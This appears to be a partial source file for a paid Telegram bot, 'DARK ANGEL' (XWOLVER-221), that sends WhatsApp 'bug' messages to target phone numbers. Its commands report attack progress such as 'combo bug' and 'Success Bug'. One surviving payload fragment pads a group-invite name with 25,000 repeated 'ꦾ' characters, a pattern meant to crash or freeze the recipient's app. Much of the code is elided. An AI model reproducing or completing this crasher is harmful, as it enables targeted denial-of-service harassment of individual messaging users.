...
𑁍┊XWOLVER-221         
━━━━━━━━━━━━━━⪼
┏━⪼ INFORMATION XWOLVER-221
┊々 Developer  : @Fuckyatim
┊々 System     : Buy Only
...
━━━━━━━━━━━━━━━━━━
DARK ANGEL DETECTED SYSTEM ACTIVE`,
      { parse_mode: "HTML" }
    );
...
bot.command("iqc", async (ctx) => {
  ...
  try {
    ...
    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `✅ Ss Iphone By DARK ANGEL Kece ( 🕷️ )`,
      parse_mode: "Markdown"
    });
  } catch (e) {
    console.error(e);
...
╚══════════════════════════╝
        ...
        await ctx.reply(teks, {
            ...
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "👑 Contact Owner", url: "https://t.me/ZyuuOffc", style: "danger" }
                    ]
                ]
            }
        });
...
{ text: "༊𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑(ᥫ᭡)", url: `https://t.me/ZyuuOffc`, style: "success", icon_custom_emoji_id: "5422888130984308617" } // ❌ hapus style
            ]
          ]
        }
      }
...
╘═——————————————═⬡</pre></blockquote>`,
        ...
        reply_markup: {
          inline_keyboard: [
            [
              { text: "༊ 𝐂𝐇𝐄𝐊𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓 ༗", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "6034957065569441680" },    
{ text: "༊𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑(ᥫ᭡)", url: `https://t.me/ZyuuOffc`, style: "danger", icon_custom_emoji_id: "5422888130984308617" } // ❌ hapus style
            ]
          ]
        }
      }
...
╘═——————————————═⬡</pre></blockquote>`,
        ...
        reply_markup: {
          inline_keyboard: [
            [
              { text: "༊ 𝐂𝐇𝐄𝐊𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓 ༗", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "6034957065569441680" },
            { text: "༊𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑(ᥫ᭡)", url: `https://t.me/ZyuuOffc`, style: "primary", icon_custom_emoji_id: "5422888130984308617" } // ❌ hapus style
            ]
          ]
        }
      }
...
bot.command("combox", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  ...
  const processMessage = await ctx.telegram.sendPhoto(
    ...
    {
      caption: `
<pre><code class="language-javascript">⟡━⟢ DARK ANGEL ⟣━⟡
⌑ Target: ${q}
⌑ Type: combo bug
⌑ Status: Process
╘═——————————————═⬡</code></pre>`,
...
bot.command("testfunction", async (msg, match) => {
  ...
  try {
    ...
    const processMsg = await bot.sendPhoto(chatId, thumbnailUrlV2, {
      caption: `
<blockquote><pre>⬡═―—⊱ ⎧ DARK ANGEL ATTACK ⎭ ⊰―—═⬡
▢  Target: ${q}
▢  Type: Unknown Func
▢  Status: Process Bug
╘═——————————————═⬡</pre></blockquote>`,
    ...
    const finalText = `
<blockquote><pre>⬡═―—⊱ ⎧ DARK ANGEL ATTACK ⎭ ⊰―—═⬡</pre></blockquote>
▢  Target: ${q}
▢  Type: Unknown Func
▢  Status: Success Bug
╘═——————————————═⬡`;
...
console.log(`DARK ANGEL sending blank x fc click message to ${target}`);
...
     inviteExpiration: "99999999999",
     groupName: "༑ ▾ DARK ANGEL Is Here ▾ ༑" + "ꦾ".repeat(25000),
...
  console.log("[!] DARK ANGEL Bug Sent to: " + target);
}
